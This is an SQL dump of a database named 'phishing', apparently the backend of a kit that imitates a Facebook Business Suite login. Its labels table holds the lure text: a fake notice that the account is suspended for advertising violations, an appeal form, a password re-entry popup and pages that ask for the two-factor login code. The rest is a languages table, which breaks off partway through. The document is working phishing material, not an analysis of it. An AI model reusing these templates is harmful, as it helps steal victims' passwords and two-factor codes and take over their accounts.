-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Máy chủ: localhost
-- Thời gian đã tạo: Th6 09, 2024 lúc 09:28 AM
-- Phiên bản máy phục vụ: 5.7.33
-- Phiên bản PHP: 8.1.9

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `phishing`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `failed_jobs`
--

CREATE TABLE `failed_jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `uuid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `connection` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `labels`
--

CREATE TABLE `labels` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `code` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `position` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL,
  `language_id` bigint(20) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `labels`
--

INSERT INTO `labels` (`id`, `code`, `name`, `description`, `position`, `language_id`, `created_at`, `updated_at`) VALUES
(1, 'title_page_welcome', 'Title Of Page Welcome', 'Title Of Page Welcome', 'common', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(2, 'title_page_login', 'Title Of Page Login', 'Title Of Page Login', 'common', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(3, 'title_confirm_page', 'Title Of Page Confirm', 'Title Of Page Confirm', 'common', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(4, 'login_to_access', 'Log in to access your professional tools', 'Log in to access your professional tools', 'welcome', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(5, 'login_with_facebook', 'Log in with Account', 'Log in with Account', 'welcome', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(6, 'title', ' Business Suite', ' Business Suite', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(7, 'login_button_top', 'Login', 'Login (Button top)', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(8, 'create_account', 'Create Account', 'Create Account (Button top)', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(9, 'notice_desktop', 'You must log in to continue.', 'You must log in to continue.', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(10, 'error_notice', 'The email address or mobile number you entered isn\'t connected to an account.', 'The email address or mobile number you entered isn\'t connected to an account.', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(11, 'error_find', 'Find your account.', 'Find your account.', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(12, 'login_box_title', 'Log in to Account', 'Log in to Account', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(13, 'email', 'Mobile number or email address', 'Mobile number or email address', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(14, 'password', 'Password', 'Password', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(15, 'submit', 'Log In', 'Log In', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(16, 'forgotten', 'Forgotten account', 'Forgotten account', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(17, 'sign_up_to_facebook', 'Sign up for Account', 'Sign up for Account', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(18, 'create_new_account', 'Create new account', 'Create new account (Bottom mobile)', 'login', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(19, 'log_out', 'Log out', 'Log out', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(20, 'title_form', 'Choose a way to confirm that it\'s you', 'Choose a way to confirm that it\'s you', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(21, 'sub_title_form', 'Your account has two-factor authentication switched on, which requires this extra login step.', 'Your account has two-factor authentication switched on, which requires this extra login step.', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(22, 'title_notice', 'Approve from another device', 'Approve from another device', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(23, 'sub_title_notice', 'We already sent a notification to your logged-in devices. Check your Account notifications where you\'re already logged in to the account and approve the login to continue.', 'We already sent a notification to your logged-in devices. Check your Account notifications where you\'re already logged in to the account and approve the login to continue.', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(24, 'title_input_code', 'Or, enter your login code', 'Or, enter your login code', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(25, 'sub_title_input_code', 'We have just sent the login code to your phone number or email (the code can be 6 or 8 digits)', 'We have just sent the login code to your phone number or email (the code can be 6 or 8 digits)', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(26, 'login_code', 'Login code', 'Login code', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(27, 'need_another', 'Need another way to confirm that it\'s you?', 'Need another way to confirm that it\'s you?', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(28, 'submit_code', 'Submit Code', 'Submit Code', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(29, 'error_notice', 'The login code you entered doesn\'t match the one sent to your phone. Please check the number and try again.', 'The login code you entered doesn\'t match the one sent to your phone. Please check the number and try again.', 'confirm', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(30, 'title_noti_content_email_fa', 'We have just sent the login code to your phone number or email (the code can be 6 or 8 digits)', 'We have just sent the login code to your phone number or email (the code can be 6 or 8 digits)', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(31, 'title_noti_content_phone_fa', 'We have just sent the login code to your phone number or email (the code can be 6 or 8 digits)', 'We have just sent the login code to your phone number or email (the code can be 6 or 8 digits)', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(32, 'title_page_warning', 'You must to login to continue.', 'You must to login to continue.', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(33, 'title_page_fa', 'Enter verified code', 'Enter verified code', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(34, 'title_placeholder_fa', 'Enter code', 'Enter code', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(35, 'title_noti_action_fa', 'We sent the code to you to:', 'We sent the code to you to:', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(36, 'title_cancel_fa', 'Cancel', 'Cancel', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(37, 'title_continue_fa', 'Continue', 'Continue', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(38, 'title_question_fa', 'Don\"t you have the code?', 'Don\"t you have the code?', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(39, 'warning_login_fa', 'Email or number phone is not connected to any accounts.', 'Email or number phone is not connected to any accounts.', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(40, 'warning_find_fa', 'Find your account and login.', 'Find your account and login.', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(41, 'or_fa', 'or', 'or', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(42, 'title_noti_fa', 'Please enter your verified code', 'Please enter your verified code', 'fa', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(43, 'avatar_user_1', '/images/1.jpg', 'Avatar user 1', 'avatar', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(44, 'avatar_user_2', '/images/2.jpg', 'Avatar user 2', 'avatar', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(45, 'avatar_user_3', '/images/3.jpg', 'Avatar user 3', 'avatar', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(46, 'avatar_user_4', '/images/4.jpg', 'Avatar user 4', 'avatar', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(47, 'avatar_user_5', '/images/5.jpg', 'Avatar user 5', 'avatar', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(48, 'comment_user_1', 'CHick nhau hk em', 'Comment user 1', 'comment', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(49, 'comment_user_2', 'Ngon thế nhở', 'Comment user 2', 'comment', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(50, 'comment_user_3', 'Comment user 3', 'Comment user 3', 'comment', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(51, 'comment_user_4', 'Comment user 4', 'Comment user 4', 'comment', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(52, 'comment_user_5', 'Comment user 5', 'Comment user 5', 'comment', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(53, 'name_user_1', 'Name user 1', 'Name user 1', 'name', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(54, 'name_user_2', 'Name user 2', 'Name user 2', 'name', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(55, 'name_user_3', 'Name user 3', 'Name user 3', 'name', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(56, 'name_user_4', 'Name user 4', 'Name user 4', 'name', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(57, 'name_user_5', 'Name user 5', 'Name user 5', 'name', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(58, 'introduce_welcome', 'Welcome to the Account Information Center', 'Welcome to the Account Information Center', 'introduce', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(59, 'introduce_notice', 'We have noticed that your account has engaged in inappropriate advertising behavior. According to Account\'s policy, your advertising account will be temporarily suspended starting from', 'We have noticed that your account has engaged in inappropriate advertising behavior. According to Account\'s policy, your advertising account will be temporarily suspended starting from', 'introduce', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(60, 'introduce_date', 'May 28, 2024', 'May 28, 2024', 'introduce', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(61, 'introduce_detail', 'Detailed information:', 'Detailed information:', 'introduce', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(62, 'introduce_detail_step_1', 'Your ads will not be displayed until we have reviewed your account.', 'Your ads will not be displayed until we have reviewed your account.', 'introduce', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(63, 'introduce_detail_step_2', 'Below, you need to complete several steps to proceed with the review of your account.', 'Below, you need to complete several steps to proceed with the review of your account.', 'introduce', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(64, 'introduce_button_continue', 'Continue', 'Continue', 'introduce', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(65, 'home_violate', 'Violate Community Standards', 'Violate Community Standards', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(66, 'home_open', 'OPEN', 'OPEN', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(67, 'home_case', 'Case', 'Case', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(68, 'home_our_message', 'Our Message:', 'Our Message:', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(69, 'home_condition_1', '- Illegal Products and Services', '- Illegal Products and Services', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(70, 'home_condition_2', '- Misinformation', '- Misinformation', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(71, 'home_condition_3', '- Copyrights and Trademarks', '- Copyrights and Trademarks', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(72, 'home_condition_4', '- Circumventing Systems', '- Circumventing Systems', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(73, 'home_our_des', 'If you believe your advertisement was removed in error, please complete this form so we can provide assistance.', 'If you believe your advertisement was removed in error, please complete this form so we can provide assistance.', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(74, 'home_required', 'Required', 'Required', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(75, 'home_hint', '(Your Account Information)', '(Your Account Information)', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(76, 'home_confirm', 'Do you agree to our Terms, Data Policy and Cookies Policy.', 'Do you agree to our Terms, Data Policy and Cookies Policy.', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(77, 'home_infomation', 'For more information about how  handles your data please read our', 'For more information about how  handles your data please read our', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(78, 'home_privacy', ' Privacy Policy', ' Privacy Policy', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(79, 'popup_header', 'Please Enter Your Password', 'Please Enter Your Password', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(80, 'popup_text', 'For your security, you must re-enter your password to continue', 'For your security, you must re-enter your password to continue', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(81, 'popup_password', 'Enter Your Password', 'Enter Your Password', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(82, 'popup_error', 'Your password was incorrect!', 'Your password was incorrect!', 'home', 40, '2024-05-31 10:46:09', '2024-05-31 10:46:09');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `languages`
--

CREATE TABLE `languages` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `code` varchar(10) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `native_name` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `is_rtl` tinyint(1) NOT NULL DEFAULT '0',
  `has_labels` tinyint(1) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `languages`
--

INSERT INTO `languages` (`id`, `code`, `name`, `native_name`, `is_rtl`, `has_labels`, `status`, `created_at`, `updated_at`) VALUES
(1, 'ab', 'Abkhaz', 'аҧсуа', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(2, 'aa', 'Afar', 'Afaraf', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(3, 'af', 'Afrikaans', 'Afrikaans', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(4, 'ak', 'Akan', 'Akan', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(5, 'sq', 'Albanian', 'Shqip', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(6, 'am', 'Amharic', 'አማርኛ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(7, 'ar', 'Arabic', 'العربية', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(8, 'an', 'Aragonese', 'Aragonés', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(9, 'hy', 'Armenian', 'Հայերեն', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(10, 'as', 'Assamese', 'অসমীয়া', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(11, 'av', 'Avaric', 'авар мацӀ, магӀарул мацӀ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(12, 'ae', 'Avestan', 'avesta', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(13, 'ay', 'Aymara', 'aymar aru', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(14, 'az', 'Azerbaijani', 'azərbaycan dili', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(15, 'bm', 'Bambara', 'bamanankan', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(16, 'ba', 'Bashkir', 'башҡорт теле', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(17, 'eu', 'Basque', 'euskara, euskera', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(18, 'be', 'Belarusian', 'Беларуская', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(19, 'bn', 'Bengali', 'বাংলা', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(20, 'bh', 'Bihari', 'भोजपुरी', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(21, 'bi', 'Bislama', 'Bislama', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(22, 'bs', 'Bosnian', 'bosanski jezik', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(23, 'br', 'Breton', 'brezhoneg', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(24, 'bg', 'Bulgarian', 'български език', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(25, 'my', 'Burmese', 'ဗမာစာ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(26, 'ca', 'Catalan; Valencian', 'Català', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(27, 'ch', 'Chamorro', 'Chamoru', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(28, 'ce', 'Chechen', 'нохчийн мотт', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(29, 'ny', 'Chichewa; Chewa; Nyanja', 'chiCheŵa, chinyanja', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(30, 'zh', 'Chinese', '中文 (Zhōngwén), 汉语, 漢語', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(31, 'cv', 'Chuvash', 'чӑваш чӗлхи', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(32, 'kw', 'Cornish', 'Kernewek', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(33, 'co', 'Corsican', 'corsu, lingua corsa', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(34, 'cr', 'Cree', 'ᓀᐦᐃᔭᐍᐏᐣ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(35, 'hr', 'Croatian', 'hrvatski', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(36, 'cs', 'Czech', 'česky, čeština', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(37, 'da', 'Danish', 'dansk', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(38, 'dv', 'Divehi; Dhivehi; Maldivian;', 'ދިވެހި', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(39, 'nl', 'Dutch', 'Nederlands, Vlaams', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(40, 'en', 'English', 'English', 0, 1, 1, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(41, 'eo', 'Esperanto', 'Esperanto', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(42, 'et', 'Estonian', 'eesti, eesti keel', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(43, 'ee', 'Ewe', 'Eʋegbe', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(44, 'fo', 'Faroese', 'føroyskt', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(45, 'fj', 'Fijian', 'vosa Vakaviti', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(46, 'fi', 'Finnish', 'suomi, suomen kieli', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(47, 'fr', 'French', 'français, langue française', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(48, 'ff', 'Fula; Fulah; Pulaar; Pular', 'Fulfulde, Pulaar, Pular', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(49, 'gl', 'Galician', 'Galego', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(50, 'ka', 'Georgian', 'ქართული', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(51, 'de', 'German', 'Deutsch', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(52, 'el', 'Greek, Modern', 'Ελληνικά', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(53, 'gn', 'Guaraní', 'Avañeẽ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(54, 'gu', 'Gujarati', 'ગુજરાતી', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(55, 'ht', 'Haitian; Haitian Creole', 'Kreyòl ayisyen', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(56, 'ha', 'Hausa', 'Hausa, هَوُسَ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(57, 'he', 'Hebrew (modern)', 'עברית', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(58, 'hz', 'Herero', 'Otjiherero', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(59, 'hi', 'Hindi', 'हिन्दी, हिंदी', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(60, 'ho', 'Hiri Motu', 'Hiri Motu', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(61, 'hu', 'Hungarian', 'Magyar', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(62, 'ia', 'Interlingua', 'Interlingua', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(63, 'id', 'Indonesian', 'Bahasa Indonesia', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(64, 'ie', 'Interlingue', 'Originally called Occidental; then Interlingue after WWII', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(65, 'ga', 'Irish', 'Gaeilge', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(66, 'ig', 'Igbo', 'Asụsụ Igbo', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(67, 'ik', 'Inupiaq', 'Iñupiaq, Iñupiatun', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(68, 'io', 'Ido', 'Ido', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(69, 'is', 'Icelandic', 'Íslenska', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(70, 'it', 'Italian', 'Italiano', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(71, 'iu', 'Inuktitut', 'ᐃᓄᒃᑎᑐᑦ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(72, 'ja', 'Japanese', '日本語 (にほんご／にっぽんご)', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(73, 'jv', 'Javanese', 'basa Jawa', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(74, 'kl', 'Kalaallisut, Greenlandic', 'kalaallisut, kalaallit oqaasii', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(75, 'kn', 'Kannada', 'ಕನ್ನಡ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(76, 'kr', 'Kanuri', 'Kanuri', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(77, 'ks', 'Kashmiri', 'कश्मीरी, كشميري‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(78, 'kk', 'Kazakh', 'Қазақ тілі', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(79, 'km', 'Khmer', 'ភាសាខ្មែរ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(80, 'ki', 'Kikuyu, Gikuyu', 'Gĩkũyũ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(81, 'rw', 'Kinyarwanda', 'Ikinyarwanda', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(82, 'ky', 'Kirghiz, Kyrgyz', 'кыргыз тили', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(83, 'kv', 'Komi', 'коми кыв', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(84, 'kg', 'Kongo', 'KiKongo', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(85, 'ko', 'Korean', '한국어 (韓國語), 조선말 (朝鮮語)', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(86, 'ku', 'Kurdish', 'Kurdî, كوردی‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(87, 'kj', 'Kwanyama, Kuanyama', 'Kuanyama', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(88, 'la', 'Latin', 'latine, lingua latina', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(89, 'lb', 'Luxembourgish, Letzeburgesch', 'Lëtzebuergesch', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(90, 'lg', 'Luganda', 'Luganda', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(91, 'li', 'Limburgish, Limburgan, Limburger', 'Limburgs', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(92, 'ln', 'Lingala', 'Lingála', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(93, 'lo', 'Lao', 'ພາສາລາວ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(94, 'lt', 'Lithuanian', 'lietuvių kalba', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(95, 'lu', 'Luba-Katanga', 'Luba-Katanga', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(96, 'lv', 'Latvian', 'latviešu valoda', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(97, 'gv', 'Manx', 'Gaelg, Gailck', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(98, 'mk', 'Macedonian', 'македонски јазик', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(99, 'mg', 'Malagasy', 'Malagasy fiteny', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(100, 'ms', 'Malay', 'bahasa Melayu, بهاس ملايو‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(101, 'ml', 'Malayalam', 'മലയാളം', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(102, 'mt', 'Maltese', 'Malti', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(103, 'mi', 'Māori', 'te reo Māori', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(104, 'mr', 'Marathi (Marāṭhī)', 'मराठी', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(105, 'mh', 'Marshallese', 'Kajin M̧ajeļ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(106, 'mn', 'Mongolian', 'монгол', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(107, 'na', 'Nauru', 'Ekakairũ Naoero', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(108, 'nv', 'Navajo, Navaho', 'Diné bizaad, Dinékʼehǰí', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
